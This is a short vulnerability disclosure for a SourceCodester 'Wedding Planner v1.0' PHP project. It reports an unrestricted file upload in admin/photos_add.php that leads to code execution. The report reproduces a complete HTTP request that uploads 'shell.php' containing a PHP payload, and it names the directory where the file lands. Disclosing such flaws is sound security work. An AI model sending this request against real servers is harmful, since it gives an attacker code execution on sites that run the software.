# Wedding Planner v1.0 by pushpam02 has arbitrary code execution (RCE)

BUG_Author: Li4u

vendor: https://www.sourcecodester.com/php/15375/wedding-planner-project-php-free-download.html

Vulnerability url: http://ip/Wedding-Management-PHP/admin/photos_add.php

Loophole location: Add function of Upload phpotos module in background management system-- > there is an arbitrary file upload vulnerability (RCE) in the OR Drag Your Images image upload point of photos_add.php file.

Request package for file upload：

```sql
POST /Wedding-Management-PHP/admin/photos_add.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/Wedding-Management-PHP/admin/photos_add.php
Content-Length: 229
Content-Type: multipart/form-data; boundary=---------------------------203341102920780
Cookie: PHPSESSID=ncd6h7doujvbbft46r0m7mbr6s
Connection: close

-----------------------------203341102920780
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------203341102920780--
```

The files will be uploaded to this directory \Wedding-Management-PHP\admin\upload\gallery
![image](https://user-images.githubusercontent.com/54017627/183275287-022aaffa-c5e5-48e4-a8a1-fe090ac3419f.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/183275303-0c470eae-3f16-47d0-abb9-3c49000a3c7f.png)
